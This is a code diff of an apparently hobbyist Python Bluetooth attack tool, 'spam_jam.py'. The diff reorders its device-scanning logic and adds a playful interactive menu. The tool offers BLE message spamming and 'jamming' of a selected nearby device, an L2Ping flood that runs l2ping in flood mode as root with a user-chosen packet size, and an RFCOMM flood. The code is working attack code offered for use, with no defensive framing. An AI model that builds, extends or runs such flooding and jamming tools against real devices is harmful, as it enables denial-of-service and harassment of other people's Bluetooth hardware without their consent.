@@ -31,7 +31,7 @@ class BLESpam(DefaultDelegate):
 # 🚀 BLE Spamming with User Input!
 def spam_ble(target_mac):
     print(f"🚀 Spamming device {target_mac} 💥💜")
-    custom_message = input("💜 Enter your custom spam message: ").encode()  
+    custom_message = input("💜 Enter your custom spam message: ").encode()
 
     try:
         peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
@@ -49,16 +49,15 @@ def jam_ble():
     scanner = Scanner()
     devices = scanner.scan(10.0)
 
-    for idx, device in enumerate(devices):
-        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
-
     if not devices:
         print("⚠️ No BLE devices found. Try again!")
         return
 
-    device_idx = input("💜 Enter the index of the device to jam: ")
+    for idx, device in enumerate(devices):
+        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
+
     try:
-        device_idx = int(device_idx)
+        device_idx = int(input("💜 Enter the index of the device to jam: "))
         target_device = devices[device_idx].addr
     except (ValueError, IndexError):
         print("⚠️ Invalid index.")
@@ -89,7 +88,7 @@ def scan_bluetooth():
 
     try:
         subprocess.run(["bluetoothctl", "scan", "on"], check=True)
-        time.sleep(10)  
+        time.sleep(10)
 
         result = subprocess.run(["bluetoothctl", "devices"], capture_output=True, text=True)
         devices = result.stdout.strip().split("\n")
@@ -110,13 +109,13 @@ def scan_bluetooth():
 def l2ping_attack():
     """Send a customizable Bluetooth L2Ping flood attack to a target device."""
     addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
-    
+
     if os.geteuid() != 0:
         print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
         return
 
     packet_size = input("💜 Enter packet size (default 600, max 672): ") or "600"
-    
+
     try:
         packet_size = int(packet_size)
         if packet_size > 672:
@@ -125,9 +124,9 @@ def l2ping_attack():
     except ValueError:
         print("⚠️ Invalid input! Using default size: 600 bytes.")
         packet_size = 600  
-    
+
     attack_mode = input("💜 Flood mode? (y/n): ").lower() == "y"
-    
+
     if attack_mode:
         print(f"💥 Flooding {addr} with {packet_size}-byte L2Ping packets!")
         subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), '-f', addr], check=True)
@@ -172,7 +171,25 @@ def rfcomm_flood():
 
     print("✅ RFCOMM flood completed!")
 
-# ✅ Properly Call `main()`
-if __name__ == "__main__":
+# 🏁 Main Function
+def main():
     print_banner()
+    while True:
+        print("\n🔹 1️⃣ Spam a BLE device 💌")
+        print("🔹 2️⃣ Jam a BLE device 🚫")
+        print("🔹 3️⃣ Scan for Bluetooth devices 📡")
+        print("🔹 4️⃣ L2Ping Attack 💥")
+        print("🔹 5️⃣ RFCOMM Flood 💥")
+        print("🔹 6️⃣ Start Bluetooth Service 📡")
+        print("🔹 7️⃣ Quit 🚪")
+
+        choice = input("💜 Choose an option (1-7): ")
+
+        if choice == "7":
+            print("👋 Goodbye, fren! XOXOXO 💜")
+            sys.exit()
+        elif choice in "123456":
+            globals()[['spam_ble', 'jam_ble', 'scan_bluetooth', 'l2ping_attack', 'rfcomm_flood', 'start_bluetooth'][int(choice) - 1]]()
+
+if __name__ == "__main__":
     main()
